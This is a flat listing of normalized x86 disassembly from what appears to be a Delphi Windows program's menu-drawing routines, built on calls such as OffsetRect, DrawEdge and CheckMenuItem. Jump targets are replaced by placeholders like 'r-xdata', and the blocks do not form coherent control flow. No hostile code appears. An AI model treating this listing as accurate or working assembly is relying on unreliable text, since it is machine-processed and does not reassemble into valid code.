cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445faf
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
sub eax 0xa
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_444534
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_445470
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_445fc8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_4468d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d120
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001d
call sub_41cd48
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff00000e
call sub_41c55c
jmp r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x30 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x31 ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x30 ]
mov al [ eax + 0x60 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x31 ] al
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x18 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x1c ]
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0xc ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x30 ]
mov edx r-xdata
call sub_404284
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00001e
call sub_41cd48
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d120
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x2
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
xor edx edx
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
add [ eax - 0x8 ] 0x2
mov eax [ ebp + 0x8 ]
add [ eax - 0x4 ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
jne r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x41 ] al
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44225c
cmp ebx eax
jl r-xdata
push 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
movzx eax [ eax + 0x38 ]
mov eax [ eax * 4 + rw-data ]
push eax
mov eax [ ebp + 0x8 ]
add eax 0xfffffff0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d4a0
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x4c ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov esi [ eax + 0x4c ]
test esi esi
je r-xdata
mov al 0x1
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
add eax 0x10
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x40 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
dec [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cd40
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
dec eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x39 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x21 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000d
call sub_41cd48
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x10 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ebx [ eax + 0x40 ]
cmp ebx 0xffffffff
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
mov edx 0xff00000f
call sub_41cd48
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d120
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cd40
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov edx 0xff000014
mov eax 0xff00000f
call sub_4231a8
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cd1c
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d120
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
sub eax [ edx + 0x34 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x40 ]
add eax [ edx + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x20 ]
lea edi [ edx - 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x20
je r-xdata
mov eax [ ebp + 0x8 ]
test [ eax + 0xd ] 0x1
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax - 0x20 ] 0x2
mov eax [ ebp + 0x8 ]
dec [ eax - 0x18 ]
mov eax [ ebp + 0x8 ]
movzx eax [ eax - 0x31 ]
mov ax [ eax * 2 + rw-data ]
or ax 0x60
movzx eax ax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x64 ] eax
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x65 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d120
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x10 ]
sub edx eax
sar edx 0x1
jns r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_42106c
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4c ] eax
xor eax eax
push ebp
push sub_446413
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
push 0x7ff8
push 0x0
call LoadBitmapA
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_422154
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov edx 0xff000012
call sub_41c55c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov esi [ ecx - 0xc ]
sub edx esi
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_44225c
cmp ebx eax
jge r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0x14 ]
call sub_41cd48
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
inc [ eax - 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax - 0x39 ] 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
or eax 0x400
or eax 0x100
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_445470
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x5c ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x54 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x50 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx - 0x58 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x14 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0x1c ]
sub eax edx
sar eax 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
mov dl [ r-xdata ]
call sub_41c828
mov eax [ ebp + 0x8 ]
or [ eax - 0x64 ] 0x100000
mov eax [ ebp + 0x8 ]
test [ eax + 0xc ] 0x40
je r-xdata
push 0xf
push 0x2
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d4a0
push eax
call DrawEdge
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x4c ]
mov eax [ ebp + 0x8 ]
lea edx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d230
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
lea esi [ eax - 0x5c ]
lea edi [ edx - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ ebp + 0x8 ]
sub edx [ ecx - 0xc ]
sub edx eax
sar edx 0x1
jns r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
sub eax edx
inc eax
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] edx
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx esi
inc edx
push edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx - 0x10 ]
sub edx ebx
sub edx eax
sar edx 0x1
jns r-xdata
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov al [ eax + 0x39 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x40 ]
call sub_442774
jmp r-xdata
push eax
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
jne r-xdata
push 0xf
push 0x4
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
call sub_41d4a0
push eax
call DrawEdge
mov eax [ ebp + 0x8 ]
dec [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
dec [ eax - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
add edx [ eax - 0xc ]
inc edx
mov eax [ ebp + 0x8 ]
mov [ eax - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov eax [ eax + 0x4c ]
mov edx [ eax ]
call [ edx + 0x20 ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0xc ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x4 ] eax
adc edx 0x0
mov eax [ ebp + 0x8 ]
add edx ebx
inc edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
pop ecx
call sub_41d040
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x48 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov eax [ eax + 0xc ]
call sub_41c55c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4c ]
call sub_403128
retn
adc edx 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x64 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ eax + 0x30 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
call sub_445470
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov bx [ eax + 0x60 ]
test bx bx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x29 ] 0x0
je r-xdata
push 0xffffffff
push 0x0
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4468d7
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x5d ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax ebx
call sub_444534
mov eax [ ebp + 0x8 ]
mov [ eax - 0x20 ] 0xa
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x28 ]
mov edx [ ebp - 0x4 ]
call sub_41d2dc
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x20 ]
mov edx [ ebp + 0x8 ]
mov [ edx - 0x18 ] eax
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x29 ]
push eax
push 0x2
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x28 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x38 ]
mov ecx [ ebp - 0x4 ]
call sub_445470
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
add eax 0xffffffe0
push eax
call OffsetRect
sub_446a24
push ebx
xor ebx ebx
mov edx [ eax + 0x64 ]
jmp r-xdata
test edx edx
je r-xdata
test edx edx
je r-xdata
cmp [ edx + 0x7c ] 0x0
je r-xdata
call sub_447408
test eax eax
je r-xdata
mov ebx [ edx + 0x7c ]
jmp r-xdata
mov edx [ edx + 0x64 ]
mov eax ebx
pop ebx
retn
mov ebx [ eax + 0x48 ]
sub_446a54
push ebp
mov ebp esp
add esp 0xfffffeac
mov [ ebp - 0x154 ] 0x154
push 0x0
lea eax [ ebp - 0x154 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0xbc ]
mov [ eax ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ ebp - 0xb8 ]
mov [ eax ] edx
sub_446aa0
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x8 ] edx
mov edi eax
xor eax eax
push ebp
push sub_446c82
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax edi
mov si 0xfff2
call sub_403324
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor ebx ebx
mov bl 0x1
push ebp
call sub_446a54
pop ecx
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x5
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffffe
xor eax eax
jmp r-xdata
mov eax edi
call sub_447408
mov esi eax
mov eax edi
call sub_446a24
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x30 ]
mov edx r-xdata
call sub_404284
jne r-xdata
cmp [ edi + 0x4c ] 0x0
je r-xdata
cmp [ edi + 0x40 ] 0xffffffff
jg r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xfffffff9
xor eax eax
mov eax [ edi + 0x4c ]
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
test bl bl
jne r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax ] 0x10
test bl bl
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x30 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
lea eax [ ebp - 0x20 ]
xor ecx ecx
mov edx 0x10
call sub_402b3c
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
add [ eax ] 0x3
mov eax [ ebp - 0x4 ]
add [ eax ] 0xf
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x10
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
xor ebx ebx
jmp r-xdata
xor ebx ebx
mov bl [ esi + 0x60 ]
jmp r-xdata
mov si [ edi + 0x60 ]
test si si
je r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_403f10
lea edx [ ebp - 0x24 ]
mov eax esi
call sub_444534
mov ecx [ ebp - 0x24 ]
lea eax [ ebp - 0x10 ]
mov edx [ edi + 0x30 ]
call sub_404184
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_446c89
lea eax [ ebp - 0x24 ]
call sub_403e78
lea eax [ ebp - 0x10 ]
call sub_403e78
retn
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx edi
mov eax [ edi + 0xa4 ]
call [ edi + 0xa0 ]
xor eax eax
mov al bl
mov ax [ eax * 2 + rw-data ]
or ax 0x40
or ax 0x20
or ax 0x100
or ax 0x400
movzx eax ax
lea edx [ ebp - 0x20 ]
push edx
push 0x0
push eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax edi
call sub_445470
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
add eax 0x7
mov edx [ ebp - 0x4 ]
add [ edx ] eax
cmp [ edi + 0xa2 ] 0x0
je r-xdata
sub_446cb4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
mov edx esi
call sub_404284
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x30 ]
mov edx esi
call sub_403ecc
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_446cdc
push ebx
push esi
push edi
mov ebx eax
mov esi [ ebx + 0x64 ]
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_446e4c
dec eax
test eax eax
jl r-xdata
inc eax
mov esi eax
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ eax + 0x3d ] 0x0
je r-xdata
mov edx edi
mov eax [ ebx + 0x64 ]
call sub_446e5c
cmp ebx eax
je r-xdata
mov dl [ eax + 0x3f ]
cmp dl [ ebx + 0x3f ]
jne r-xdata
xor edx edx
call sub_446d24
sub_446d24
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x38 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x38 ] bl
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
test bl bl
je r-xdata
test [ esi + 0x1c ] 0x2
jne r-xdata
cmp [ esi + 0x3d ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x0
push eax
movzx eax [ esi + 0x50 ]
push eax
mov eax edi
call sub_4453e0
push eax
call CheckMenuItem
mov eax esi
call sub_446cdc
sub_446d78
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp bl [ esi + 0x39 ]
je r-xdata
pop edi
pop esi
pop ebx
retn
mov [ esi + 0x39 ] bl
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
mov eax esi
call sub_446e4c
test eax eax
jne r-xdata
mov edi [ esi + 0x64 ]
test edi edi
je r-xdata
